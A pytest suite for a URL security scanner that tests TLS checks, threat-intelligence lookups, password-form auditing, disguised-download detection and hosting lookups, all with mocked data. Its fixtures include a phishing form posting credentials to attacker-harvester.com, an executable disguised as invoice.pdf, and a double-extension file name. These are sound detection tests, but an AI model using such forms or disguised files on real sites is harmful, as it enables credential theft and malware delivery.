"""
Comprehensive test suite for Cyclops Six Advanced URL Security Intelligence Features:
- Feature 1: SSL/TLS Certificate Intelligence
- Feature 2: Real-Time Threat Intelligence & DNS Blocklists (URLhaus, GSB, VT, AbuseIPDB)
- Feature 3: Password and Sensitive Input Auditing
- Feature 4: Dangerous Download and Hidden File Extension Detection
- Feature 5: Hosting Provider and Infrastructure Footprint
- Feature 6: Trustworthy Agency and Security Authority Audit
"""
import pytest
from unittest.mock import patch, MagicMock, AsyncMock

from app.scanner.ssl_inspector import (
    inspect_tls_certificate,
    _matches_hostname,
    _parse_x509_name,
    SslCertificateIntelligence
)
from app.scanner.reputation import (
    check_urlhaus,
    check_google_safe_browsing,
    check_virustotal,
    check_abuseipdb,
    synthesize_authority_checklist,
    ProviderResult
)
from app.scanner.html_inspector import (
    analyze_static_html,
    build_sensitive_input_audit,
    FormAnalysis
)
from app.scanner.download_detector import (
    evaluate_download_safety,
    parse_content_disposition_filename,
    inspect_magic_bytes
)
from app.scanner.dns_intelligence import (
    lookup_ip_hosting_intelligence,
    lookup_reverse_dns,
    HostingIntelligence
)
from app.scanner.url_pipeline import orchestrate_url_scan
from app.scanner.url_validator import normalize_and_validate_url
from app.scanner.ssrf import SafeFetchResult
from app.scanner.rdap import DomainRegistrationInfo


# ============================================================================
# Feature 1: SSL/TLS Certificate Intelligence Tests
# ============================================================================

def test_matches_hostname():
    # Exact match
    assert _matches_hostname("example.com", ["example.com"], "example.com") is True
    assert _matches_hostname("EXAMPLE.COM", ["example.com"], "") is True
    # Wildcard match
    assert _matches_hostname("sub.example.com", ["*.example.com"], "") is True
    # Hostname mismatch
    assert _matches_hostname("other.com", ["example.com"], "example.com") is False
    assert _matches_hostname("sub.sub.example.com", ["*.example.com"], "") is False


def test_parse_x509_name():
    raw_tuple = ((("commonName", "example.com"),), (("organizationName", "DigiCert Inc"),))
    parsed = _parse_x509_name(raw_tuple)
    assert parsed["commonName"] == "example.com"
    assert parsed["organizationName"] == "DigiCert Inc"


@pytest.mark.anyio
async def test_ssl_inspector_http_unencrypted():
    res = await inspect_tls_certificate("example.com", is_https=False)
    assert res.status == "unencrypted_http"
    assert res.is_valid is False
    assert "unencrypted HTTP" in res.plain_language_explanation
    assert len(res.warnings) > 0


@pytest.mark.anyio
async def test_ssl_inspector_ssrf_blocks_private_ip():
    res = await inspect_tls_certificate("127.0.0.1", is_https=True, ip_override="127.0.0.1")
    assert res.status == "unable_to_verify"
    assert "SSRF" in res.warnings[0] or "private" in res.plain_language_explanation.lower()


@pytest.mark.anyio
async def test_ssl_inspector_valid_mocked():
    mock_cert = {
        "issuer": ((("organizationName", "Let's Encrypt"), ("commonName", "R3")),),
        "subject": ((("commonName", "example.com"),),),
        "subjectAltName": (("DNS", "example.com"), ("DNS", "www.example.com")),
        "notBefore": "Jan  1 00:00:00 2025 GMT",
        "notAfter": "Dec 31 23:59:59 2030 GMT",
    }
    with patch("socket.create_connection") as mock_conn, \
         patch("ssl.create_default_context") as mock_ctx:
        mock_sock = MagicMock()
        mock_conn.return_value.__enter__.return_value = mock_sock
        mock_ssock = MagicMock()
        mock_ctx.return_value.wrap_socket.return_value.__enter__.return_value = mock_ssock
        mock_ssock.getpeercert.return_value = mock_cert
        mock_ssock.version.return_value = "TLSv1.3"
        mock_ssock.cipher.return_value = ("TLS_AES_256_GCM_SHA384", "TLSv1.3", 256)

        res = await inspect_tls_certificate("example.com", ip_override="93.184.216.34")
        assert res.is_valid is True
        assert res.status == "valid"
        assert res.issuer == "Let's Encrypt"
        assert res.is_public_ca is True
        assert res.hostname_match is True
        assert res.days_remaining is not None and res.days_remaining > 0
        assert "HTTPS encrypts your connection" in res.plain_language_explanation


# ============================================================================
# Feature 2: Real-Time Threat Intelligence Provider Tests
# ============================================================================

@pytest.mark.anyio
async def test_urlhaus_clean_response():
    with patch("httpx.AsyncClient.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"query_status": "no_results"}
        mock_post.return_value = mock_resp

        res = await check_urlhaus("https://example.com/safe-page")
        assert res.provider_name == "abuse.ch URLhaus"
        assert res.status == "clean"
        assert res.is_malicious is False


@pytest.mark.anyio
async def test_urlhaus_malicious_match():
    with patch("httpx.AsyncClient.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "query_status": "ok",
            "threat": "malware_download",
            "url_status": "online",
            "tags": ["AgentTesla", "executable"],
            "date_added": "2026-03-01 12:00:00 UTC",
            "urlhaus_reference": "https://urlhaus.abuse.ch/url/12345/"
        }
        mock_post.return_value = mock_resp

        res = await check_urlhaus("http://malware-drop.xyz/invoice.exe")
        assert res.status == "malicious_found"
        assert res.is_malicious is True
        assert res.detection_category == "Malware Distribution"
        assert "AgentTesla" in res.threat_details


@pytest.mark.anyio
async def test_gsb_unconfigured_without_api_key(monkeypatch):
    monkeypatch.delenv("GOOGLE_SAFE_BROWSING_API_KEY", raising=False)
    res = await check_google_safe_browsing("https://example.com")
    assert res.status == "not_configured"
    assert "API key not configured" in res.error_message


@pytest.mark.anyio
async def test_virustotal_unconfigured_without_api_key(monkeypatch):
    monkeypatch.delenv("VIRUSTOTAL_API_KEY", raising=False)
    res = await check_virustotal("https://example.com")
    assert res.status == "not_configured"
    assert "API key not configured" in res.error_message


@pytest.mark.anyio
async def test_abuseipdb_unconfigured_without_api_key(monkeypatch):
    monkeypatch.delenv("ABUSEIPDB_API_KEY", raising=False)
    res = await check_abuseipdb("93.184.216.34")
    assert res.status == "not_configured"
    assert "API key not configured" in res.error_message


# ============================================================================
# Feature 3: Password and Sensitive Input Auditing Tests
# ============================================================================

def test_sensitive_input_audit_detects_credentials_and_cross_origin():
    html = """
    <html>
      <body>
        <form action="https://attacker-harvester.com/collect" method="POST">
          <input type="email" name="user_email" />
          <input type="password" name="user_password" />
          <input type="hidden" name="csrf" value="abc" />
          <button type="submit">Log In</button>
        </form>
      </body>
    </html>
    """
    analysis = analyze_static_html(html, "legitimate-portal.com", is_https=True)
    audit = analysis.sensitive_input_audit
    assert audit is not None
    assert audit.password_fields_detected == 1
    assert audit.email_login_fields_detected == 1
    assert audit.cross_origin_submission_detected is True
    assert "attacker-harvester.com" in audit.cross_origin_details[0]
    assert any("Cross-origin" in w for w in audit.warnings)


def test_sensitive_input_audit_detects_payment_fields():
    html = """
    <html>
      <body>
        <form action="/checkout/pay" method="POST">
          <input type="text" name="card_number" />
          <input type="text" name="cvv" />
          <input type="text" name="expiration" />
        </form>
      </body>
    </html>
    """
    analysis = analyze_static_html(html, "store.example.com", is_https=True)
    audit = analysis.sensitive_input_audit
    assert audit is not None
    assert audit.payment_fields_detected == 1
    assert audit.cross_origin_submission_detected is False


def test_sensitive_input_audit_contextual_explanation_on_established_site():
    html = """
    <html>
      <body>
        <form action="/login" method="POST">
          <input type="password" name="password" />
        </form>
      </body>
    </html>
    """
    analysis = analyze_static_html(html, "example.com", is_https=True, domain_age_days=1000)
    audit = analysis.sensitive_input_audit
    assert audit is not None
    assert audit.password_fields_detected == 1
    assert "Verify the domain before entering credentials" in audit.evidence_based_explanation


# ============================================================================
# Feature 4: Dangerous Download and Hidden Extension Tests
# ============================================================================

def test_content_disposition_filename_parsing():
    assert parse_content_disposition_filename('attachment; filename="statement.pdf"') == "statement.pdf"
    assert parse_content_disposition_filename("attachment; filename*=UTF-8''invoice_2026.pdf.exe") == "invoice_2026.pdf.exe"
    assert parse_content_disposition_filename(None) is None


def test_download_detector_standard_webpage():
    res = evaluate_download_safety(
        final_url="https://example.com/about",
        headers={"content-type": "text/html; charset=utf-8"},
        prefix_bytes=b"<!DOCTYPE html><html><head><title>About</title></head></html>"
    )
    assert res.is_download is False
    assert res.detected_format == "HTML Webpage"
    assert len(res.inspection_limitations) > 0


def test_download_detector_disguised_executable_mismatch():
    # Server headers say it's invoice.pdf, but magic bytes are MZ (Windows executable)
    mz_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"
    res = evaluate_download_safety(
        final_url="https://downloads.example.com/files/invoice.pdf",
        headers={
            "content-disposition": 'attachment; filename="invoice.pdf"',
            "content-type": "application/octet-stream"
        },
        prefix_bytes=mz_payload
    )
    assert res.is_download is True
    assert res.mismatch_detected is True
    assert "The server reports an executable file, although its filename resembles a document" in res.warning


def test_download_detector_double_extension():
    res = evaluate_download_safety(
        final_url="https://downloads.example.com/invoice.pdf.exe",
        headers={"content-type": "application/x-msdownload"},
        prefix_bytes=b"MZ\x00\x00"
    )
    assert res.is_download is True
    assert res.has_double_extension is True
    assert res.is_executable_or_script is True
    assert "Disguised double file extension detected" in res.warning


# ============================================================================
# Feature 5: Hosting Provider and Infrastructure Footprint Tests
# ============================================================================

@pytest.mark.anyio
async def test_hosting_footprint_cloud_cdn_detection():
    with patch("httpx.AsyncClient.get") as mock_get, \
         patch("app.scanner.dns_intelligence.lookup_reverse_dns", return_value="104.21.5.10.cloudflare.com"):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "status": "success",
            "country": "United States",
            "countryCode": "US",
            "regionName": "California",
            "city": "San Francisco",
            "lat": 37.77,
            "lon": -122.41,
            "isp": "Cloudflare, Inc.",
            "org": "Cloudflare, Inc.",
            "as": "AS13335 Cloudflare, Inc."
        }
        mock_get.return_value = mock_resp

        res = await lookup_ip_hosting_intelligence("104.21.5.10")
        assert res.status == "live"
        assert res.is_cloud_or_cdn is True
        assert res.cdn_provider == "Cloudflare Edge"
        assert res.reverse_dns == "104.21.5.10.cloudflare.com"
        assert "Edge server geolocation reflects network routing points" in res.contextual_note


# ============================================================================
# Feature 6: Security Authority Audit Checklist Tests
# ============================================================================

def test_synthesize_authority_checklist_clean():
    providers = [
        ProviderResult(provider_name="abuse.ch URLhaus", status="clean", is_malicious=False, threat_details="No threat reported."),
        ProviderResult(provider_name="Google Safe Browsing", status="not_configured", error_message="API key missing."),
        ProviderResult(provider_name="VirusTotal", status="not_configured", error_message="API key missing."),
        ProviderResult(provider_name="AbuseIPDB", category="ip_reputation", status="not_configured", error_message="API key missing.")
    ]
    checklist = synthesize_authority_checklist(
        providers=providers,
        ssl_status="valid",
        ssl_issuer="Let's Encrypt",
        rdap_status="live",
        domain_age_days=1200,
        target_ip="93.184.216.34"
    )
    assert len(checklist.items) >= 6
    assert checklist.threats_reported_count == 0
    assert checklist.clean_verdicts_count >= 2
    assert "absence of reported detections does not guarantee that a website is safe" in checklist.disclaimer


def test_synthesize_authority_checklist_with_threat():
    providers = [
        ProviderResult(
            provider_name="abuse.ch URLhaus",
            status="malicious_found",
            is_malicious=True,
            threat_details="Active malware distribution endpoint."
        )
    ]
    checklist = synthesize_authority_checklist(
        providers=providers,
        ssl_status="expired",
        ssl_issuer="Expired Issuer",
        rdap_status="unavailable",
        domain_age_days=None,
        target_ip=None
    )
    assert checklist.threats_reported_count >= 2  # URLhaus + Expired SSL
    assert "Threat indicators or certificate issues identified" in checklist.summary


# ============================================================================
# End-to-End URL Pipeline Integration Test
# ============================================================================

@pytest.mark.anyio
async def test_orchestrate_url_scan_returns_all_six_features():
    with patch("app.scanner.url_pipeline.resolve_domain_dns") as mock_dns, \
         patch("app.scanner.url_pipeline.lookup_domain_rdap", new_callable=AsyncMock) as mock_rdap, \
         patch("app.scanner.url_pipeline.safe_fetch_url", new_callable=AsyncMock) as mock_fetch, \
         patch("app.scanner.url_pipeline.inspect_tls_certificate", new_callable=AsyncMock) as mock_ssl, \
         patch("app.scanner.url_pipeline.lookup_ip_hosting_intelligence", new_callable=AsyncMock) as mock_host, \
         patch("app.scanner.url_pipeline.check_urlhaus", new_callable=AsyncMock) as mock_urlhaus:

        from app.scanner.dns_intelligence import DnsIntelligence, DnsRecord
        mock_dns.return_value = DnsIntelligence(
            hostname="example.com",
            resolved_ips=["93.184.216.34"],
            dns_records=[DnsRecord(record_type="A", value="93.184.216.34")]
        )
        mock_rdap.return_value = DomainRegistrationInfo(
            domain="example.com",
            status="live",
            registrar="MarkMonitor Inc.",
            domain_age_days=9500,
            created_date="1995-09-03"
        )
        mock_fetch.return_value = SafeFetchResult(
            final_url="https://example.com/",
            initial_url="https://example.com/",
            final_status_code=200,
            final_resolved_ip="93.184.216.34",
            content_type="text/html",
            html_content="<html><head><title>Example Domain</title></head><body><h1>Example</h1></body></html>",
            raw_prefix_bytes=b"<!DOCTYPE html>",
            headers={"content-type": "text/html"}
        )
        mock_ssl.return_value = SslCertificateIntelligence(
            hostname="example.com",
            status="valid",
            connection_status="HTTPS (TLS Encrypted)",
            is_valid=True,
            is_public_ca=True,
            issuer="DigiCert Global Root G2",
            hostname_match=True
        )
        mock_host.return_value = HostingIntelligence(
            ip_address="93.184.216.34",
            country="United States",
            asn="AS15133",
            organization="EDGECAST",
            status="live"
        )
        mock_urlhaus.return_value = ProviderResult(
            provider_name="abuse.ch URLhaus",
            status="clean",
            is_malicious=False
        )

        report = await orchestrate_url_scan("https://example.com")

        # Verify all 6 features are populated on report
        assert report.ssl_certificate is not None
        assert report.ssl_certificate.is_valid is True
        assert len(report.reputation_providers) > 0
        assert report.sensitive_input_audit is not None
        assert report.download_safety is not None
        assert report.hosting_footprint is not None
        assert report.security_authority_checklist is not None
        assert report.verdict == "clean"
        assert report.risk_level == "LOW"
